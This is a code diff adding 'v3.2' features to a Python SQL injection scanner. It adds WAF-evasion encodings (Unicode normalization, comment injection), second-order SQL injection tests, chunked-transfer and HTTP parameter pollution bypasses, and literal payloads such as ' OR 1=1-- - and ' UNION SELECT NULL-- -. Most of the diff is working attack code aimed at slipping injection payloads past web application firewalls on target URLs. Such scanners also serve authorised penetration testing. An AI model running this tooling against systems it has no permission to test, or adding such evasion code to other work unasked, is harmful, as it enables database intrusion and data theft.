@@ -28,6 +28,16 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 from bs4 import BeautifulSoup
 from loguru import logger
 
+# v3.2 Advanced WAF bypass + second-order SQLi
+try:
+    from advanced_techniques import (
+        WAFBypassArsenal,
+        SecondOrderSQLi,
+    )
+    HAS_ADVANCED = True
+except ImportError:
+    HAS_ADVANCED = False
+
 
 @dataclass
 class SQLiResult:
@@ -647,6 +657,16 @@ class SQLiScanner:
         for name, func in self.EVASION_TECHNIQUES.items():
             try:
                 encoded.append(func(payload))
+            except Exception:
+                pass
+        # v3.2: Advanced WAF bypass (Unicode normalization + comment injection)
+        if HAS_ADVANCED:
+            try:
+                encoded.extend(WAFBypassArsenal.unicode_normalization_bypass(payload))
+            except Exception:
+                pass
+            try:
+                encoded.extend(WAFBypassArsenal.comment_injection_variants(payload))
             except Exception:
                 pass
         return list(set(encoded))
@@ -1858,6 +1878,99 @@ class SQLiScanner:
             # ═══ 5. JSON Body Injection ═══
             json_results = await self.test_json_body_injection(url, session, waf_name)
             results.extend(json_results)
+            
+            # ═══ 6. Second-Order SQLi (v3.2) ═══
+            if not results and HAS_ADVANCED:
+                try:
+                    # Collect forms from crawl or POST discovery
+                    forms_for_2nd_order = []
+                    if forms:
+                        forms_for_2nd_order = forms
+                    findings = await SecondOrderSQLi.test_second_order(
+                        url, forms_for_2nd_order, session, timeout=self.timeout,
+                    )
+                    for f in findings:
+                        results.append(SQLiResult(
+                            url=f["store_url"],
+                            parameter=f["field"],
+                            vulnerable=True,
+                            injection_type="second_order",
+                            dbms=f.get("db_info", ""),
+                            technique="second_order_stored",
+                            confidence=f.get("confidence", 0.75),
+                            injection_point="post",
+                            payload_used=f.get("payload", ""),
+                        ))
+                except Exception as e:
+                    logger.debug(f"Second-order SQLi test failed: {e}")
+
+            # ═══ 7. Chunked Transfer WAF Bypass (v3.2) ═══
+            if not results and HAS_ADVANCED and waf_name:
+                try:
+                    base_url, params = self._parse_url(url)
+                    if params:
+                        first_param = list(params.keys())[0]
+                        for payload in ["' OR 1=1-- -", "' UNION SELECT NULL-- -"]:
+                            resp = await WAFBypassArsenal.chunked_transfer_bypass(
+                                url, payload, first_param, session, timeout=self.timeout,
+                            )
+                            if resp:
+                                for dbms_name, patterns in self.DBMS_ERRORS.items():
+                                    for pat in patterns:
+                                        if pat.search(resp):
+                                            results.append(SQLiResult(
+                                                url=url,
+                                                parameter=first_param,
+                                                vulnerable=True,
+                                                injection_type="error",
+                                                dbms=dbms_name,
+                                                technique="chunked_transfer_bypass",
+                                                confidence=0.8,
+                                                payload_used=payload,
+                                            ))
+                                            break
+                                    if results:
+                                        break
+                            if results:
+                                break
+                except Exception as e:
+                    logger.debug(f"Chunked transfer bypass failed: {e}")
+
+            # ═══ 8. HTTP Parameter Pollution (v3.2) ═══
+            if not results and HAS_ADVANCED and waf_name:
+                try:
+                    base_url, params = self._parse_url(url)
+                    if params:
+                        first_param = list(params.keys())[0]
+                        for payload in ["' OR '1'='1", "1' AND 1=1-- -"]:
+                            hpp_urls = WAFBypassArsenal.http_parameter_pollution(
+                                url, first_param, payload,
+                            )
+                            for hpp_url in hpp_urls[:2]:
+                                body, _ = await self._fetch(hpp_url, session)
+                                if body:
+                                    for dbms_name, patterns in self.DBMS_ERRORS.items():
+                                        for pat in patterns:
+                                            if pat.search(body):
+                                                results.append(SQLiResult(
+                                                    url=url,
+                                                    parameter=first_param,
+                                                    vulnerable=True,
+                                                    injection_type="error",
+                                                    dbms=dbms_name,
+                                                    technique="hpp_bypass",
+                                                    confidence=0.75,
+                                                    payload_used=payload,
+                                                ))
+                                                break
+                                        if results:
+                                            break
+                                if results:
+                                    break
+                            if results:
+                                break
+                except Exception as e:
+                    logger.debug(f"HPP bypass failed: {e}")
         
         except Exception as e:
             logger.error(f"Scan error for {url}: {e}")
